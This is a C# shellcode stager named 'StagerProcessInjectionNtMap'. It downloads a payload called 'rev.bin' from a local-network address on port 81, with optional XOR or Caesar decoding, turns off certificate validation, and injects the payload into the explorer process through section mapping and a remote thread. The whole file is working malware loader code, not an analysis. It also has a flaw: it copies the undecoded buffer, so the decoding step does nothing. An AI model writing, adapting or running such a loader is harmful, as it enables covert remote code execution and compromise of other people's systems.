using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;

namespace StagerProcessInjectionNtMap
{
    internal class Program
    {
        private static string url = "http://192.168.0.131:81/rev.bin";
        private static string decryption = "";
        private static char key = 'k';
        private static string process_name = "explorer";

        const uint SECTION_ALL_ACCESS = 0xF001F;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PAGE_READWRITE = 0x04;
        const uint SEC_COMMIT = 0x08000000;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("ntdll.dll")]
        static extern uint NtCreateSection(
            out IntPtr sectionHandle,
            uint desiredAccess,
            IntPtr objectAttributes,
            ref Int64 maximumSize,
            uint sectionPageProtection,
            uint allocationAttributes,
            IntPtr fileHandle);

        [DllImport("ntdll.dll")]
        public static extern uint NtMapViewOfSection(
            IntPtr sectionHandle,
            IntPtr processHandle,
            ref IntPtr baseAddress, 
            IntPtr zeroBits,
            uint commitSize,  
            ref IntPtr sectionOffset, 
            ref IntPtr viewSize, 
            uint inheritDisposition,
            uint allocationType,
            uint win32Protect);

        [DllImport("ntdll.dll")]
        static extern uint NtUnmapViewOfSection(IntPtr processHandle, IntPtr baseAddress);

        [DllImport("ntdll.dll")]
        static extern uint NtClose(IntPtr handle);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void DownloadAndExecute()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] buf = client.DownloadData(url);
            byte[] shellcode = null;

            switch (decryption)
            {
                case "xor":
                    shellcode = xor(buf, key);
                    break;

                case "caesar":
                    shellcode = caesar(buf, key);
                    break;

                // not encoded
                default:
                    shellcode = buf;
                    break;
            }

            long payload_length = buf.Length;
            Process[] processes = Process.GetProcessesByName(process_name);
            if (processes.Length == 0)
            {
                Console.WriteLine($"Process {process_name} not found.");
                return;
            }
            Process targetProcess = processes[0];

            IntPtr hSection;
            NtCreateSection(
                out hSection,
                SECTION_ALL_ACCESS,
                IntPtr.Zero,
                ref payload_length,
                PAGE_EXECUTE_READWRITE,
                SEC_COMMIT,      
                IntPtr.Zero
            );

            IntPtr localBaseAddr = IntPtr.Zero;
            IntPtr localOffset = IntPtr.Zero;
            IntPtr localViewSize = IntPtr.Zero;
            IntPtr commitSize = IntPtr.Zero;

            NtMapViewOfSection(
                hSection,
                Process.GetCurrentProcess().Handle,
                ref localBaseAddr,
                IntPtr.Zero,
                0,
                ref localOffset,
                ref localViewSize,
                2, 0, PAGE_READWRITE
            );

            Marshal.Copy(buf, 0, localBaseAddr, buf.Length);

            IntPtr remoteBaseAddr = IntPtr.Zero;
            IntPtr remoteOffset = IntPtr.Zero;
            IntPtr remoteViewSize = IntPtr.Zero;
            IntPtr remoteCommitSize = IntPtr.Zero;

            NtMapViewOfSection(
                hSection,
                targetProcess.Handle,
                ref remoteBaseAddr,
                IntPtr.Zero,
                0,
                ref remoteOffset,
                ref remoteViewSize,
                2, 0, PAGE_EXECUTE_READWRITE
            );

            CreateRemoteThread(
                targetProcess.Handle,
                IntPtr.Zero,
                0,
                remoteBaseAddr,
                IntPtr.Zero,
                0,
                IntPtr.Zero
            );

            NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, localBaseAddr);
            NtClose(hSection);
        }

        public static void Main(String[] args)
        {
            DownloadAndExecute();
        }

        private static byte[] xor(byte[] buf, char key)
        {
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] ^ (byte)key));
            }

            return encoded;
        }

        private static byte[] caesar(byte[] buf, char key)
        {
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] - (byte)key) & 0xFF);
            }

            return encoded;
        }
    }
}
